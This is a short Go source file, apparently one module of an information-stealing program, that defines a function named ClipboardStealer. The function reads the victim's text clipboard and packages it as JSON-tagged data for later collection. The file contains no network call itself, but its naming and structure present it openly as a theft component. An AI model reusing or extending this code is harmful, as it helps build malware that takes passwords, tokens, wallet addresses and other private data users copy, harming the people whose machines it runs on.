package core

import (
	"golang.design/x/clipboard"
)

type ClipboardContents struct {
	Clipboard string `json:"clipboard"`
}

func ClipboardStealer() []ClipboardContents {
	var clipboardCurrent []ClipboardContents
	err := clipboard.Init()
	if err != nil {
		return nil
	}
	clipboardContents := clipboard.Read(clipboard.FmtText)
	clipboardCurrent = append(clipboardCurrent, ClipboardContents{
		Clipboard: string(clipboardContents),
	})
	return clipboardCurrent
}
